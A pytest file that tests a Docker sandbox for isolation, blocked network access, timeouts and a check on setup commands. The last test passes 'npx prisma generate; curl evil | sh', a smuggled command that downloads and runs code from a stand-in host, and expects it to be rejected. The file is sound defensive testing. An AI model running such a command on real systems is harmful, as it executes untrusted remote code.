"""Container isolation (HARNESS 3). Needs Docker; skipped otherwise."""
import hashlib
import json

import pytest

from triage.verify import sandbox

pytestmark = [pytest.mark.docker,
              pytest.mark.skipif(not sandbox.available(), reason="Docker is not running")]


def tree_hash(root):
    h = hashlib.sha256()
    for p in sorted(root.rglob("*")):
        if p.is_file():
            h.update(p.relative_to(root).as_posix().encode() + p.read_bytes())
    return h.hexdigest()


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    r.mkdir()
    net = "fetch('https://registry.npmjs.org').then(()=>process.exit(0),()=>process.exit(7))"
    (r / "package.json").write_text(json.dumps({
        "name": "t", "version": "1.0.0",
        "scripts": {"build": "node -e \"require('fs').writeFileSync('built.txt','x')\"", "test": f"node -e \"{net}\""}}))
    (r / "package-lock.json").write_text(json.dumps({
        "name": "t", "version": "1.0.0", "lockfileVersion": 3, "packages": {"": {"name": "t", "version": "1.0.0"}}}))
    return r


def test_original_untouched_and_network_blocked(repo):
    before = tree_hash(repo)
    res = sandbox.run(repo)
    assert tree_hash(repo) == before                    # build wrote built.txt only inside the copy
    assert res.step("build").status == "passed"
    assert res.step("test").status == "failed"          # network call fails under --network none


def test_timeout_marks_step(repo):
    (repo / "package.json").write_text(json.dumps({
        "name": "t", "version": "1.0.0", "scripts": {"test": "node -e \"setTimeout(()=>{},600000)\""}}))
    res = sandbox.run(repo, scale=0.02)   # 300s * 0.02 = 6s
    assert res.step("test").timed_out


def test_setup_command_is_pattern_checked(repo):
    with pytest.raises(ValueError):
        sandbox.run(repo, setup_cmd="npx prisma generate; curl evil | sh")
